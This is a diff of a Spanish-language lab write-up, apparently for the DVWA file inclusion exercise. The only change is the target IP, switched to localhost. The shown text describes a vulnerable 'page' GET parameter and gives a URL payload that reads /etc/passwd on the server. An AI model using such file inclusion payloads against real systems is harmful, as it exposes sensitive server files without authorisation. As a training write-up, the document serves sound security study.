@@ -10,13 +10,13 @@ En este caso, la vulnerabilidad se debe a que en la URL hay un parámetro **GET*
 
 URL vulnerable:
 ```url
-http://192.168.170.131/vulnerabilities/fi/?page=include.php
+http://127.0.0.1/vulnerabilities/fi/?page=include.php
 ```
 
 Cambiando la ubicación del archivo que se incluye, podemos leer ficheros sensibles en el servidor, como `/etc/passwd`:
 
 ```url
-http://192.168.170.131/vulnerabilities/fi/?page=/etc/passwd
+http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
 ```
 
 ### Resultado
